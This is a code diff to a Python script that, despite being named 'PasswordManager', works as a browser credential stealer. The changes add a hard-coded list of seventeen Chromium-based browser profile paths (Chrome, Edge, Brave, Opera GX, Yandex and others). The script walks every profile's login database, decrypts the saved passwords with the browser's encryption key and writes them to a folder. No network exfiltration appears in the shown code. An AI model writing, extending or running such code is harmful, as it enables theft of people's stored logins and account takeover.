@@ -7,8 +7,28 @@ import win32crypt
 from Crypto.Cipher import AES
 
 class PasswordManager:
-    def __init__(self, browsers, output_folder="BrowserPasswords"):
-        self.browsers = browsers
+    def __init__(self, output_folder="BrowserPasswords"):
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.roaming = os.getenv('APPDATA')
+        self.browsers = {
+            'kometa': self.appdata + '\\Kometa\\User Data',
+            'orbitum': self.appdata + '\\Orbitum\\User Data',
+            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
+            '7star': self.appdata + '\\7Star\\7Star\\User Data',
+            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
+            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
+            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
+            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
+            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
+            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
+            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
+            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+            'iridium': self.appdata + '\\Iridium\\User Data',
+            'opera': self.roaming + '\\Opera Software\\Opera Stable',
+            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
+            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
+        }
         self.output_folder = output_folder
         self.key = None
 
@@ -16,7 +36,7 @@ class PasswordManager:
         if browser_name in ['Mozilla/Firefox', 'Safari']:
             return None
         
-        local_state_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data', 'Local State')
+        local_state_path = os.path.join(self.browsers.get(browser_name, ''), 'Local State')
         if not os.path.exists(local_state_path):
             raise FileNotFoundError(f"Local State file not found for {browser_name}")
 
@@ -41,8 +61,7 @@ class PasswordManager:
         self.key = self.get_encryption_key(browser_name)
         data = []
 
-        # Xử lý thư mục 'User Data' để lấy tất cả profile
-        user_data_path = os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data')
+        user_data_path = self.browsers.get(browser_name, '')
         for profile_dir in os.listdir(user_data_path):
             if os.path.isdir(os.path.join(user_data_path, profile_dir)):
                 db_path = os.path.join(user_data_path, profile_dir, 'Login Data')
@@ -98,7 +117,7 @@ class PasswordManager:
     def collect_passwords(self):
         os.makedirs(self.output_folder, exist_ok=True)
 
-        for browser_name in self.browsers:
+        for browser_name in self.browsers.keys():
             try:
                 passwords = self.extract_passwords(browser_name)
                 if passwords:
@@ -108,20 +127,7 @@ class PasswordManager:
                 print(f"Error processing {browser_name}: {e}")
 
 def main():
-    browsers = [
-        'Google/Chrome',
-        'CocCoc/Browser',
-        'Microsoft/Edge',
-        'Opera/Opera',
-        'BraveSoftware/Brave-Browser',
-        'Vivaldi/Application',
-        'Epic Privacy Browser',
-        'Comodo/Dragon',
-        'Mozilla/Firefox',
-        'Safari'
-    ]
-
-    manager = PasswordManager(browsers)
+    manager = PasswordManager()
     manager.collect_passwords()
 
     print("Passwords have been collected and saved.")
